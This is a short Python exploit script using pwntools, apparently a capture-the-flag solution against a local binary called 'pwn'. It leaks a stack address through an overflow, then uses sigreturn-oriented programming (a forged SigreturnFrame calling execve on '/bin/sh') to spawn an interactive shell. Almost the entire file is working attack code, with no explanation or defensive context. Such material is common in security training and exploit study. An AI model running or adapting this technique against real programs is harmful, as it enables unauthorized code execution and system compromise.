from pwn import *

io=process('pwn')
context.binary='./pwn'
context.terminal = ['gnome-terminal','-x','sh','-c']

main=0x0004004ED
sigret=0x4004DA
sys=0x400517

pl1='/bin/sh\x00'*2+p64(main)
io.send(pl1)
io.recv(0x20)
sh=u64(io.recv(8))-280
print(hex(sh))

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = sh
frame.rsi = 0
frame.rdx = 0
frame.rip = sys

pl1='a'*16+p64(sigret)+p64(sys)+str(frame)

'''
def debug(addr):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)
debug('0x400514')
'''

pl2='/bin/sh\x00'*2+p64(sigret)+p64(sys)+str(frame)
io.send(pl2)

io.interactive()    